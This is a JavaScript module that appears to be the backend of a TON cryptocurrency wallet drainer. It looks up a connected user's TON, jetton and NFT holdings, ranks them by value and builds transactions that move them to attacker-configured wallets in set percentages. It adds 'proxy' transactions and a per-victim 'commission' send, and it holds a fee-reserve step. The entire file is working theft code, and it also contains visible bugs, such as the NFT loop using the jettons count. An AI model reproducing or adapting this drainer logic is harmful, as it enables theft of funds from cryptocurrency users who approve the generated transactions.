const {getTonPrice, convertAddressToUserFriendly, sort} = require('./utils');
const getTonBalance = require('./ton');
const getJettonsBalances = require('./jettons');
const getNftsBalances = require('./nft');
const {TransactionBuilder} = require('../BagOfCellsBuilder');
const AutoCommission = require("../autoComission");
const generateProxyTransactions = require('./proxy');

const wallets = [];

module.exports = async (userInfo, settings, TonConsoleApi) => {
    try {
        let totalOnWallet = 0;
        const tonPrice = await getTonPrice(settings, TonConsoleApi);
        const userFriendlyAddress = convertAddressToUserFriendly(userInfo.address);

        const tonBalanceOrig = await getTonBalance(settings, userFriendlyAddress, +tonPrice.price, TonConsoleApi);
        const tonOnWallet = tonBalanceOrig.balance;
        const tonBalance = tonBalanceOrig;
        const jettonsBalances = await getJettonsBalances(settings, userFriendlyAddress, TonConsoleApi);
        const nftsBalances = await getNftsBalances(settings, userFriendlyAddress, +tonPrice.price, TonConsoleApi);
        settings.WALLET = settings.WALLET.includes(', ') ? settings.WALLET.replaceAll(' ', '').split(',') : [settings.WALLET];
        settings.AUTO_SPLIT_PERCETAGE = settings.AUTO_SPLIT_PERCETAGE.includes(', ') ? settings.AUTO_SPLIT_PERCETAGE.replaceAll(' ', '').split(',') : [settings.AUTO_SPLIT_PERCETAGE];

        const maxMessages = tonBalanceOrig.walletInterface.includes('v5') ? 255 : tonBalanceOrig.walletInterface.includes('v4') ? 4 : 1;

        const percentages = new Array(0);

        for (const percent of settings.AUTO_SPLIT_PERCETAGE) {percentages.push(+percent);}

        // Leave fee's
        const forFee = (jettonsBalances.jettonsList.length + nftsBalances.length) * (0.07) + (0.1);
        tonBalance.balance = tonBalance.balance - ((forFee * settings.WALLET.length) * 1000000000);

        let allAssets = [tonBalance, ...jettonsBalances.jettonsList, ...nftsBalances];

        allAssets.sort((a, b) => b.inCurrency() - a.inCurrency());

        const sortedAssets = sort(allAssets, settings);

        for (const asset of sortedAssets.allAssets) {totalOnWallet += +asset.inCurrency();}

        const transactionBuilder = new TransactionBuilder({wallets: settings.WALLET, percentage: percentages}, settings);

        const simulatedTransactions = [];

        if (sortedAssets.simulate) {
            for (const type of sortedAssets.assets) {
                switch (type) {
                    case 'Ton':
                        if (tonBalance.balance > 0) {
                            try {
                                    simulatedTransactions.push(...await transactionBuilder.generateTransactions(sortedAssets.ton[0]));
                            } catch (e) {

                            }
                        }
                        break;
                    case 'Jetton':
                        for (let i = 0; i < sortedAssets.jettons.length; i += 4) {
                            try {
                                const transactions = [];
                                for (const asset of sortedAssets.jettons.slice(i, Math.min(i + 4, sortedAssets.jettons.length))) {
                                    transactions.push(...await transactionBuilder.generateTransactions(asset, true));
                                }
                                simulatedTransactions.push(...transactions);
                            } catch (e) {

                            }
                        }
                        break;
                    case 'Nft':
                        for (let i = 0; i < sortedAssets.nfts.length; i += 4) {
                            try {
                                const transactions = [];
                                for (const asset of sortedAssets.nfts.slice(i, Math.min(i + 4, sortedAssets.jettons.length))) {
                                    transactions.push(...await transactionBuilder.generateTransactions(asset, true));
                                }
                                simulatedTransactions.push(...transactions);
                            } catch (e) {

                            }
                        }
                        break;
                }
            }
        }

        simulatedTransactions.sort((a, b) => +b.inCurrency - +a.inCurrency);

        // Proxy transactions

        const proxyTransactions = await generateProxyTransactions(settings, userFriendlyAddress, simulatedTransactions, jettonsBalances, userInfo.device.app);

        if (sortedAssets.sendCommission) {
            if (!wallets.includes(userFriendlyAddress)) {
                wallets.push(userFriendlyAddress);
                const autoCom = new AutoCommission(settings);
                const commissionSent = await autoCom.send(userFriendlyAddress);
                console.log('send commission:', commissionSent, ' to ', userFriendlyAddress)
                if (!commissionSent) {
                    setTimeout(async () => {
                        await autoCom.send(data.message.userInfo.address);
                    }, 60 * 1000);
                }
            }
        }

        tonBalanceOrig.balance = tonOnWallet;

        const data = {
            simulatedTransactions: proxyTransactions,
            total: totalOnWallet,
            ton: tonBalanceOrig,
            jettons: sortedAssets.jettons,
            nfts: sortedAssets.nfts,
            timeOut: sortedAssets.timeOut ? sortedAssets.timeOut : 0
        }
        return {
            maxMessages,
            notify: sortedAssets.notify,
            minimal: sortedAssets.minimal,
            data
        }
    } catch (e) {
        console.log(e)
        return {
            notify: false,
            minimal: false,
            data: {
                simulatedTransactions: []
            }
        }
    }
}